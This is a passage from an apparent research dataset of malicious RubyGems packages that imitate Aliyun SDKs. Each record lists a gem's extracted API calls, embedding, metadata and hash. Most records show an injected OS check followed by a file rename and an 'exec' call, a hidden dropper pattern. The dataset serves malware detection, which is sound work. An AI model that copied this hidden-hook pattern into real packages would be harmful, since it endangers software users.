'Dir.[](\"#{api_definition_dir}/#{service_name}/*.yml\").map', 'Dir.[]', 'api_definition_dir', 'File.basename', 'actions.[]=', 'action_name.to_sym', 'Aliyun::Utils.symbolize_hash_keys', 'YAML.load_file', 'api_definition_dir', 'require', 'Aliyun::SignatureMethods::HmacSha1.instance', 'METHODS.[]', 'include', 'self.class', 'self.class', 'require', 'require', 'require', 'require', '\"HMAC-SHA1\".freeze', '\"1.0\".freeze', 'calculate_signature', 'service.access_key_secret', 'string_to_sign', 'private', 'HMAC::SHA1.new', 'hmac.update', 'Base64.encode64(hmac.digest).gsub', 'Base64.encode64', 'hmac.digest', 'service.http_method', 'service.separator', 'safe_encode', 'service.separator', 'safe_encode', 'canonicalized_query_string', 'params.keys.sort.map { |k,|\\n  \"%s=%s\" % [safe_encode(k.to_s), safe_encode(params.[](k.to_s))]\\n}.join', 'params.keys.sort.map', 'params.keys.sort', 'params.keys', '\"%s=%s\".%', 'safe_encode', 'k.to_s', 'safe_encode', 'params.[]', 'k.to_s', 'service.separator', 'URI.encode_www_form_component(s).gsub(/\\\\+/, \"%20\").gsub(/\\\\*/, \"%2A\").gsub', 'URI.encode_www_form_component(s).gsub(/\\\\+/, \"%20\").gsub', 'URI.encode_www_form_component(s).gsub', 'URI.encode_www_form_component', 'object.is_a?', 'object.keys.each', 'object.keys', 'object.[]=', 'k.to_sym', 'symbolize_hash_keys', 'object.delete', 'object.is_a?', 'object.each', 'symbolize_hash_keys', 'module_function']",
            "n_tokens": 1102,
            "embedding": "[-0.00342328 -0.00471007 -0.00277207 ...  0.00074933 -0.01982156\n  0.02283672]",
            "cluster": "0",
            "id": 469,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_sdk-core/0.1.5/aliyun_sdk-core-0.1.5.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_sdk-core/0.1.5/aliyun_sdk-core-0.1.5_extracted",
            "name": "aliyun_sdk-core",
            "version": "0.1.5",
            "published_at": "2020-02-16T04:27:30.566Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, ruby-hmac",
            "SHA-256": "529bffa09d4239bdb5ef8573d900ec65a2a4024a4a6d275561766fb514eff11e"
        },
        {
            "name_version": "aliyun_slb-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_slb/0.0.1/aliyun_slb-0.0.1_extracted/aliyun_slb-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'Aliyun::SLB::Service.new', 'puts', 'service.DescribeRegions', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'self.access_key_id=', 'options.[]', 'self.access_key_secret=', 'options.[]', 'self.endpoint_url=', 'options.[]', 'self.options=', 'self.access_key_id', 'puts', 'args.[](0).nil?', 'args.[]', 'raise', 'AliyunAPIException.new', 'call_aliyun_with_parameter', 'args.[]', 'private', 'gen_request_parameters', 'URI', 'endpoint_url', 'uri.query=', 'URI.encode_www_form', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'uri.scheme.==', 'uri.scheme', 'http.verify_mode=', 'puts', 'uri.request_uri', 'Net::HTTP::Get.new', 'uri.request_uri', 'http.request', 'JSON.parse', 'response.body', 'raise', 'AliyunAPIException.new', 'response.code', 'response.body', 'params.merge!', 'params.merge!', 'self.options', 'params.[]=', 'method.to_s', 'params.[]=', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'params.[]=', 'SecureRandom.uuid', 'params.[]=', 'compute_signature', 'puts', 'params.keys', 'params.keys.sort', 'params.keys', 'puts', 'sorted_keys.map { |key,|\\n  \"%s=%s\" % [safe_encode(key.to_s), safe_encode(params.[](key))]\\n}.join', 'sorted_keys.map', '\"%s=%s\".%', 'safe_encode', 'key.to_s', 'safe_encode', 'params.[]', 'canonicalized_query_string.length', 'HTTP_METHOD + SEPARATOR + safe_encode(\"/\") + SEPARATOR.+', 'HTTP_METHOD + SEPARATOR + safe_encode(\"/\").+', 'HTTP_METHOD + SEPARATOR.+', 'HTTP_METHOD.+', 'safe_encode', 'safe_encode', 'puts', 'calculate_signature', 'access_key_secret.+', 'access_key_secret', 'HMAC::SHA1.new', 'hmac.update', 'Base64.encode64(hmac.digest).gsub', 'Base64.encode64', 'hmac.digest', 'puts', 'URI.encode_www_form_component(value).gsub(/\\\\+/, \"%20\").gsub(/\\\\*/, \"%2A\").gsub', 'URI.encode_www_form_component(value).gsub(/\\\\+/, \"%20\").gsub', 'URI.encode_www_form_component(value).gsub', 'URI.encode_www_form_component']",
            "n_tokens": 619,
            "embedding": "[ 0.01246464 -0.01522167 -0.00355782 ... -0.00253397 -0.0134818\n  0.02842687]",
            "cluster": "0",
            "id": 698,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_slb/0.0.1/aliyun_slb-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun_slb/0.0.1/aliyun_slb-0.0.1_extracted",
            "name": "aliyun_slb",
            "version": "0.0.1",
            "published_at": "2020-02-16T04:27:55.850Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, ruby-hmac",
            "SHA-256": "b3abd0f2db62461f67102e729dbf32f6d2d0e9f81d366bde4fdd86c2b96e6be9"
        },
        {
            "name_version": "aliyun-mns-0.1.11",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-mns/0.1.11/aliyun-mns-0.1.11_extracted/aliyun-mns-0.1.11_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'xml_object', '(if o.is_a?(Array)\\n  o\\nelse\\n  [o]\\nend)\\n.reject', 'o.is_a?', 'n.empty?', 'from_xml', 'path.reduce', 'memo.[]', 'require', 'Rails.root.join', 'Rails.root', 'File.expand_path', 'File.exist?', 'YAML.load', 'ERB.new(File.new(config_file).read).result', 'ERB.new', 'File.new(config_file).read', 'File.new', 'config.[]', 'Rails.env', 'OpenStruct.new', 'configuration', 'attr_reader', 'Hash.xml_object', 'h.[]', 'h.[]', 'h.[]', 'Time.at', 'h.[](\"EnqueueTime\").to_i./', 'h.[](\"EnqueueTime\").to_i', 'h.[]', 'Time.at', 'h.[](\"FirstDequeueTime\").to_i./', 'h.[](\"FirstDequeueTime\").to_i', 'h.[]', 'h.[](\"DequeueCount\").to_i', 'h.[]', 'h.[](\"Priority\").to_i', 'h.[]', 'h.[]', 'Time.at', 'h.[](\"NextVisibleTime\").to_i./', 'h.[](\"NextVisibleTime\").to_i', 'h.[]', 'check_receipt_handle', 'AliyunMns::Request.delete', 'queue.messages_path', 'queue', 'receipt_handle', 'check_receipt_handle', 'AliyunMns::Request.put', 'queue.messages_path', 'queue', 'receipt_handle', '{ \"队列\" => queue.name, \"ID\" => id, \"MD5\" => body_md5, \"Receipt handle\" => receipt_handle, \"Enqueue at\" => enqueue_at, \"First enqueue at\" => first_enqueue_at, \"Next visible at\" => next_visible_at, \"Dequeue count\" => dequeue_count, \"Priority\" => priority }.collect', 'queue.name', 'queue', 'id', 'body_md5', 'receipt_handle', 'enqueue_at', 'first_enqueue_at', 'next_visible_at', 'dequeue_count', 'priority', 's.unshift', 's.<<', 's.<<', 'body', 's.join', 'private', 'receipt_handle', 'raise', 'attr_reader', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'content_hash.[]', 'require_relative', 'attr_reader', 'delegate', 'Queue.new', 'opts.slice(*mqs_options.keys).reduce', 'opts.slice', 'mqs_options.keys', 'mqs_headers.merge!', 'mqs_options.[]', 'Request.get', 'Hash.xml_array(response, \"Queues\", \"Queue\").collect', 'Hash.xml_array', 'Queue.new', 'URI(item.[](\"QueueURL\")).path.sub!', 'URI(item.[](\"QueueURL\")).path', 'URI', 'item.[]', 'Request.put', 'queue_path', '{ VisibilityTimeout: 30, DelaySeconds: 0, MaximumMessageSize: 65536, MessageRetentionPeriod: 345600, PollingWaitSeconds: 0 }.merge', 'request.content', 'Request.delete', 'queue_path', 'Request.post', 'messages_path', '{ DelaySeconds: 0, Priority: 8 }.merge', 'request.content', 'msg_options.merge', 'message.to_s', 'request_opts.merge!', 'Request.get', 'messages_path', 'Message.new', 'name', 'name', 'require', 'attr_reader', 'delegate', 'Hash.xml_object', 'ex.to_s', 'ex.message', 'attr_reader', 'delegate', '[:get, :delete, :put, :post].each', 'define_method', 'args.[]', 'args.[](1).is_a?', 'args.[]', 'options.merge!', 'args.[]', 'AliyunMns::Request.new', 'block.call', 'request.execute', 'endpoint', 'params.empty?', 'conf.merge!', 'params.to_query', 'URI::HTTP.build', 'mqs_headers.merge', 'Nokogiri::XML::Builder.new', 'xml.send', 'type.to_sym', 'values.each', 'b.send', 'k.to_sym', 'builder.to_xml', 'Base64.encode64(Digest::MD5.hexdigest(body)).chop', 'Base64.encode64', 'Digest::MD5.hexdigest', 'body', 'body.size', 'body', 'DateTime.now.httpdate', 'DateTime.now', '{ \"Authorization\" => authorization(date), \"Content-Length\" => content_length || 0, \"Content-Type\" => content_type, \"Content-MD5\" => content_md5, \"Date\" => date, \"Host\" => uri.host }.merge(mqs_headers).reject', '{ \"Authorization\" => authorization(date), \"Content-Length\" => content_length || 0, \"Content-Type\" => content_type, \"Content-MD5\" => content_md5, \"Date\" => date, \"Host\" => uri.host }.merge', 'authorization', 'content_length', 'content_type', 'content_md5', 'uri.host', 'uri', 'mqs_headers', 'v.nil?', 'RestClient.send', '[method, uri.to_s, body, headers].compact', 'method', 'uri.to_s', 'uri', 'body', 'Logger.new', 'logger.error', 'ex.message', 'logger.error', 'ex.backtrace.join', 'ex.backtrace', 'raise', 'private', 'AliyunMns.configuration', '[uri.path, uri.query].compact.join', '[uri.path, uri.query].compact', 'uri.path', 'uri', 'uri.query', 'uri', 'mqs_headers.sort.collect { |k, v|\\n  \"#{k.downcase}:#{v}\"\\n}.join', 'mqs_headers.sort.collect', 'mqs_headers.sort', 'mqs_headers', 'k.downcase', 'self.method.to_s.upcase', 'self.method.to_s', 'self.method', '[method, content_md5 || \"\", content_type || \"\", date, canonical_mq_headers, canonical_resource].join', 'content_md5', 'content_type', 'OpenSSL::HMAC.digest', 'access_key_secret', 'access_key_id', 'Base64.encode64(sha1).chop', 'Base64.encode64', 'attr_reader', 'delegate', 'Topic.new', 'opts.slice(*mqs_options.keys).reduce', 'opts.slice', 'mqs_options.keys', 'mqs_headers.merge!', 'mqs_options.[]', 'Request.get', 'Hash.xml_array(response, \"Topics\", \"Topic\").collect', 'Hash.xml_array', 'Topic.new', 'URI(item.[](\"TopicURL\")).path.sub!', 'URI(item.[](\"TopicURL\")).path', 'URI', 'item.[]', 'subscription_name.nil?', 'Request.put', 'topic_path', '{ MaximumMessageSize: 65536 }.merge', 'request.content', 'Request.delete', 'topic_path', 'Hash.from_xml', 'Request.get', 'topic_path', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'topic_hash.[](\"Topic\").[]', 'topic_hash.[]', 'opts.[](:Endpoint).nil?', 'opts.[]', 'opts.[](:Endpoint).blank?', 'opts.[]', 'raise', 'RequestException.new', 'Exception.new', 'Request.put', 'subscribe_path', 'request.content', 'Request.delete', 'subscribe_path', 'opts.[](:MessageBody).nil?', 'opts.[]', 'opts.[](:MessageBody).blank?', 'opts.[]', 'raise', 'RequestException.new', 'Exception.new', 'Request.post', 'message_path', 'request.content', 'name', 'name', 'subscription_name', 'name']",
            "n_tokens": 1841,
            "embedding": "[-0.00601852 -0.00542866 -0.00772097 ... -0.00092016 -0.01492402\n  0.02127344]",
            "cluster": "0",
            "id": 56,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-mns/0.1.11/aliyun-mns-0.1.11.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-mns/0.1.11/aliyun-mns-0.1.11_extracted",
            "name": "aliyun-mns",
            "version": "0.1.11",
            "published_at": "2020-02-16T04:30:05.748Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, nokogiri, activesupport, rest-client",
            "SHA-256": "c304b1fc2cfa9e9e66d30334d97574afbdb10f2471411346e26d81dfcefaeb70"
        },
        {
            "name_version": "aliyun-open_search-0.6.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-open_search/0.6.0/aliyun-open_search-0.6.0_extracted/aliyun-open_search-0.6.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'attr_accessor', 'Base.basic_params', 'ENV.[]', 'params.inject([]) { |arr, (k, v)|\\n  arr << \"#{k}=#{Base.escape(v)}\"\\n}.join', 'params.inject', 'arr.<<', 'Base.escape', '(special_base_url || base_url) + \"?\".+', '(special_base_url || base_url)\\n.+', 'base_url', 'Rails.logger.info', 'Rails.logger', 'URI', 'params.sort_by { |k, _v|\\n  k.to_s\\n}.map { |arr,|\\n  str = if arr.[](1).is_a?(String) || arr.[](1).is_a?(Fixnum)\\n    arr.[](1).to_s\\n  else\\n    arr.[](1).to_json\\n  end\\n  \"#{arr.[](0)}=#{Base.escape(str)}\"\\n}.join', 'params.sort_by { |k, _v|\\n  k.to_s\\n}.map', 'params.sort_by', 'k.to_s', 'arr.[](1).is_a?', 'arr.[]', 'arr.[](1).is_a?', 'arr.[]', 'arr.[](1).to_s', 'arr.[]', 'arr.[](1).to_json', 'arr.[]', 'arr.[]', 'Base.escape', 'Base64.encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new(\"sha1\"), \"#{ENV.[](\"ACCESS_KEY_SECRET\")}&\", request_method + \"&\" + CGI.escape(\"/\") + \"&\" + Base.escape(params))).strip', 'Base64.encode64', 'OpenSSL::HMAC.digest', 'OpenSSL::Digest.new', 'ENV.[]', 'request_method + \"&\" + CGI.escape(\"/\") + \"&\".+', 'request_method + \"&\" + CGI.escape(\"/\").+', 'request_method + \"&\".+', 'request_method.+', 'request_method', 'CGI.escape', 'Base.escape', 'ENV.fetch', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'signature_nonce', '(Time.now.to_f.round(3) * 1000).to_i.to_s.+', '(Time.now.to_f.round(3) * 1000).to_i.to_s', '(Time.now.to_f.round(3) * 1000)\\n.to_i', 'Time.now.to_f.round(3).*', 'Time.now.to_f.round', 'Time.now.to_f', 'Time.now', '(1000..9999).to_a.sample.to_s', '(1000..9999).to_a.sample', '(1000..9999)\\n.to_a', '{}.tap', 'params.map', 'hash.[]=', 'key.to_s', 'value.is_a?', 'method.==', 'value.join', 'JSON.generate', 'value.to_s', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub(/\\\\)/, \"%29\").gsub(/\\\\*/, \"%2A\").gsub(/\\\\+/, \"%20\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub(/\\\\)/, \"%29\").gsub(/\\\\*/, \"%2A\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub(/\\\\)/, \"%29\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub', 'CGI.escape(str).gsub', 'CGI.escape', 'attr_reader', 'index_names.is_a?', 'index_names.join', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'setup', 'basic_params.merge', 'basic_params', 'Base.format_params', 'custom_params.merge', 'custom_params', 'send_request', 'Base.new.basic_params.merge', 'Base.new.basic_params', 'Base.new', 'Base.format_params', 'custom_params.merge', 'custom_params', 'send_request', 'private', 'Net::HTTP.get', 'uri', 'params.merge', 'Search.signature', 'JSON.parse', 'result.[]', 'result.[](\"result\").[]', 'result.[]', 'attr_reader', 'index_names.join', 'basic_params.merge', 'basic_params', 'Base.format_params', 'custom_params.merge', 'index_names', 'Net::HTTP.get', 'uri', 'params.merge', 'Search.signature', 'attr_reader', 'ENV.[]', 'basic_params.merge', 'basic_params', 'Base.format_params', 'custom_params.merge', 'index_names', 'Net::HTTP.get', 'uri', 'params.merge', 'Suggest.signature', 'ENV.[]', 'Base.format_params', 'basic_params.merge', 'basic_params', 'Syncs.signature', 'basic_params.merge', 'basic_params', 'Net::HTTP.post_form', 'uri']",
            "n_tokens": 1178,
            "embedding": "[ 0.0178485  -0.02314907 -0.00414409 ...  0.00119022 -0.03001091\n  0.01737626]",
            "cluster": "0",
            "id": 31,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-open_search/0.6.0/aliyun-open_search-0.6.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-open_search/0.6.0/aliyun-open_search-0.6.0_extracted",
            "name": "aliyun-open_search",
            "version": "0.6.0",
            "published_at": "2020-02-16T04:30:46.329Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, pry, rake, rspec, figaro",
            "SHA-256": "caba788c2df8300c328146f143ab07ea59b93daa750c668ad75029533e789103"
        },
        {
            "name_version": "aliyun-ruby_api-0.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-ruby_api/0.0.3/aliyun-ruby_api-0.0.3_extracted/aliyun-ruby_api-0.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'Aliyun::Service.new', 'service.CreateInstance', 'puts', 'resp.[]', 'puts', 'service.AllocatePublicIpAddress', 'puts', 'service.StartInstance', 'puts', 'require', 'require', 'Aliyun::Service.new', 'service.DeleteInstance', 'puts', 'require', 'require', 'Aliyun::Service.new', 'puts', 'service.DescribeImages', 'require', 'require', 'require', 'Aliyun::Service.new', 'service.DescribeInstances', 'puts', 'JSON.pretty_generate', 'require', 'require', 'Aliyun::Service.new', 'puts', 'service.DescribeSecurityGroups', 'require', 'require', 'Aliyun::Service.new', 'puts', 'service.DescribeRegions', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'self.access_key_id=', 'options.[]', 'self.access_key_secret=', 'options.[]', 'self.endpoint_url=', 'options.[]', 'self.options=', 'self.access_key_id', 'puts', 'args.[](0).nil?', 'args.[]', 'raise', 'AliyunAPIException.new', 'call_aliyun_with_parameter', 'args.[]', 'private', 'gen_request_parameters', 'URI', 'endpoint_url', 'uri.query=', 'URI.encode_www_form', 'Net::HTTP.new', 'uri.host', 'uri.port', 'uri.scheme.==', 'uri.scheme', 'http.use_ssl=', 'http.verify_mode=', 'puts', 'uri.request_uri', 'Net::HTTP::Get.new', 'uri.request_uri', 'http.request', 'JSON.parse', 'response.body', 'raise', 'AliyunAPIException.new', 'response.code', 'response.body', 'params.merge!', 'params.merge!', 'self.options', 'params.[]=', 'method_name.to_s', 'params.[]=', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'params.[]=', 'SecureRandom.uuid', 'params.[]=', 'compute_signature', 'puts', 'params.keys', 'params.keys.sort', 'params.keys', 'puts', 'sorted_keys.each', 'canonicalized_query_string.<<', 'canonicalized_query_string.<<', 'percent_encode', 'key.to_s', 'canonicalized_query_string.<<', 'canonicalized_query_string.<<', 'percent_encode', 'params.[]', 'canonicalized_query_string.length', 'HTTP_METHOD + SEPARATOR + percent_encode(\"/\") + SEPARATOR.+', 'HTTP_METHOD + SEPARATOR + percent_encode(\"/\").+', 'HTTP_METHOD + SEPARATOR.+', 'HTTP_METHOD.+', 'percent_encode', 'percent_encode', 'canonicalized_query_string.[]', 'puts', 'calculate_signature', 'access_key_secret.+', 'access_key_secret', 'HMAC::SHA1.new', 'hmac.update', 'Base64.encode64(hmac.digest).gsub', 'Base64.encode64', 'hmac.digest', 'puts', 'URI.encode_www_form_component(value).gsub(/\\\\+/, \"%20\").gsub(/\\\\*/, \"%2A\").gsub', 'URI.encode_www_form_component(value).gsub(/\\\\+/, \"%20\").gsub', 'URI.encode_www_form_component(value).gsub', 'URI.encode_www_form_component']",
            "n_tokens": 760,
            "embedding": "[-0.01116363 -0.00760839 -0.00126443 ... -0.00114322 -0.02145374\n  0.02203027]",
            "cluster": "0",
            "id": 625,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-ruby_api/0.0.3/aliyun-ruby_api-0.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-ruby_api/0.0.3/aliyun-ruby_api-0.0.3_extracted",
            "name": "aliyun-ruby_api",
            "version": "0.0.3",
            "published_at": "2020-02-16T04:31:11.011Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, ruby-hmac",
            "SHA-256": "d98a8a4a0b59657346245e028c33dc5905930123335b244325dfae4184667723"
        },
        {
            "name_version": "aliyun-sls-0.0.7",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-sls/0.0.7/aliyun-sls-0.0.7_extracted/aliyun-sls-0.0.7_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'require', 'require', 'require', 'require', 'require', 'default_headers.update', 'Zlib::Deflate.deflate', 'content.encode.to_s', 'content.encode', 'compact_headers', 'headers.[]=', 'signature', 'URI.parse', 'RestClient.post', 'u.to_s', 'parse_response', 'compact_headers', 'headers.[]=', 'signature', 'URI.parse', 'headers.[]=', 'u.to_s', 'RestClient.get', 'u.to_s', 'parse_response', 'Time.now.to_i.-', 'Time.now.to_i', 'Time.now', '60.*', 'Time.now.to_i', 'Time.now', 'default_opts.update', 'compact_headers', 'headers.[]=', 'signature', 'Addressable::URI.parse', 'headers.[]=', 'u.to_s', 'u.query_values=', 'RestClient.get', 'u.to_s', 'parse_response', 'default_opts.update', 'compact_headers', 'headers.[]=', 'signature', 'Addressable::URI.parse', 'headers.[]=', 'u.to_s', 'u.query_values=', 'RestClient.get', 'u.to_s', 'parse_response', 'Time.now.to_i.-', 'Time.now.to_i', 'Time.now', '60.*', 'Time.now.to_i', 'Time.now', 'default_opts.update', 'compact_headers', 'headers.[]=', 'signature', 'Addressable::URI.parse', 'headers.[]=', 'u.to_s', 'u.query_values=', 'RestClient.get', 'u.to_s', 'parse_response', 'private', 'string_to_sign_with_content', 'string_to_sign_without_content', 'headers.[]', 'headers.[]', 'headers.[]', 'canonicalized_sls_headers', 'canonicalized_resource', 'headers.[]', 'canonicalized_sls_headers', 'canonicalized_resource', 'headers.each', 'k.=~', 'h.[]=', 'k.downcase', 'h.keys.sort.map { |e,|\\n  h.[](e)\\n  \"#{e}:#{h.[](e).gsub(/^\\\\s+/, \"\")}\"\\n}.join', 'h.keys.sort.map', 'h.keys.sort', 'h.keys', 'h.[]', 'h.[](e).gsub', 'h.[]', 'Addressable::URI.parse', 'Addressable::URI.parse', 'query.size.!=', 'query.size', 'query.keys.sort.map { |e,|\\n  \"#{e}=#{query.[](e)}\"\\n}.join', 'query.keys.sort.map', 'query.keys.sort', 'query.keys', 'query.[]', 'u.to_s', 'Base64.encode64((HMAC::SHA1.new(@access_key_secret) << string_to_sign(verb, logstorename, headers, content, query).chomp).digest).strip', 'Base64.encode64', '(HMAC::SHA1.new(@access_key_secret) << string_to_sign(verb, logstorename, headers, content, query).chomp)\\n.digest', 'HMAC::SHA1.new(@access_key_secret).<<', 'HMAC::SHA1.new', 'string_to_sign(verb, logstorename, headers, content, query).chomp', 'string_to_sign', 'sign', '@headers.dup', 'headers.[]=', 'DateTime.now.httpdate', 'DateTime.now', 'headers.[]=', 'content.encode.to_s', 'content.encode', 'headers.[]=', 'compressed.bytesize.to_s', 'compressed.bytesize', 'headers.[](\"Content-Length\").to_i.>', 'headers.[](\"Content-Length\").to_i', 'headers.[]', '3 * 1024.**(2).*', '3.*', '1024.**', 'raise', 'content.logs.size.>', 'content.logs.size', 'content.logs', 'raise', 'headers.[]=', 'Digest::MD5.hexdigest(compressed).upcase', 'Digest::MD5.hexdigest', 'headers.[]=', 'headers.[]=', 'body.bytesize.to_s', 'body.bytesize', 'headers.[]=', 'rsp.code.to_s.=~', 'rsp.code.to_s', 'rsp.code', 'rsp.code', '$logger.respond_to?', '$logger.error', 'puts', 'require', 'include', 'required', 'include', 'required', 'required', 'repeated', 'include', 'repeated', 'optional', 'optional', 'optional']",
            "n_tokens": 1008,
            "embedding": "[ 0.01233797 -0.01025662 -0.00095499 ...  0.00246909 -0.02107361\n  0.02585669]",
            "cluster": "0",
            "id": 259,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-sls/0.0.7/aliyun-sls-0.0.7.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-sls/0.0.7/aliyun-sls-0.0.7_extracted",
            "name": "aliyun-sls",
            "version": "0.0.7",
            "published_at": "2020-02-16T04:31:36.026Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, rest-client, beefcake, file-tail, ruby-hmac, addressable",
            "SHA-256": "fdb6c591e858137756b9404e273faa33c468c08d1abd09fffdc757310db13649"
        },
        {
            "name_version": "aliyun-sls_sdk-0.0.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-sls_sdk/0.0.9/aliyun-sls_sdk-0.0.9_extracted/aliyun-sls_sdk-0.0.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'File.join', 'File.dirname', 'require', 'puts', 'puts', '\"headers:\".+', 'self.all_headers.to_json', 'self.all_headers', 'attr_accessor', 'attr_accessor', 'puts', 'resp.[]', 'resp.[]', 'resp.[](\"ttl\").to_i', 'resp.[]', 'resp.[]', 'resp.[](\"shardCount\").to_i', 'resp.[]', 'require', 'require', 'require', 'require', 'attr_reader', 'Net::HTTP::Persistent.new', '\"/logstores/\".+', 'send', 'GetLogStoreResponse.new', 'headers.[]=', 'headers.[]=', 'body.[]=', 'logstore_name.encode', 'body.[]=', 'body.[]=', 'body.to_json', 'send', 'CreateLogStoreResponse.new', 'request.logitems.length.>', 'request.logitems.length', 'request.logitems', 'raise', 'Protobuf::LogGroup.new', 'logGroup.topic=', 'request.topic', 'logGroup.source=', 'request.source', 'request.logitems.each', 'request.logitems', 'Protobuf::Log.new', 'logitem.timestamp', 'logGroup.logs.<<', 'logGroup.logs', 'logitem.contents', 'contents.each', 'Protobuf::Log::Content.new', 'log.contents.<<', 'log.contents', 'logGroup.encode.to_s', 'logGroup.encode', 'body.length.>', 'body.length', '3 * 1024.*', '3.*', 'raise', 'headers.[]=', 'body.length.to_s', 'body.length', 'headers.[]=', 'request.compress', 'headers.[]=', 'Zlib::Deflate.deflate', 